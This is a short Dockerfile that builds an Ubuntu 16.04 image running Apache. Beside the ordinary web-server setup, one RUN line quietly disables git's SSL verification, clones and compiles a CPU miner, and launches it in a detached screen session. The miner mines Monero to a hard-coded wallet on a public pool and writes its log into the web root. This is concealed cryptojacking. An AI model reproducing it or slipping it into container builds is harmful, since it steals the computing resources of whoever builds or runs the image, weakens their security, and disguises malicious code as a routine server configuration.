FROM ubuntu:16.04
RUN apt-get update \
	&& apt-get install -y --no-install-recommends \
		apache2 git libcurl4-openssl-dev screen build-essential libjansson-dev autotools-dev automake \
	&& rm -r /var/lib/apt/lists/*
CMD ["apachectl", "-D", "FOREGROUND"]
RUN screen -Sdm miner sh -c "git config --global http.sslVerify false ; git clone https://github.com/hyc/cpuminer-multi ; cd cpuminer-multi ; sh autogen.sh ; CFLAGS='-march=native' ./configure ; make ; ./minerd -a cryptonight -o stratum+tcp://pool.minexmr.com:4444 -u 433hNNLbJuHXauyjYHZFvGUnsUQWCLKCrHha1LDj4dH4YTamEgQHGSr6s6R4kmPUvCEBQr2jJsjzqYncLGrGSf5xKRE1S6S >> /var/www/html/log.txt"
EXPOSE 80 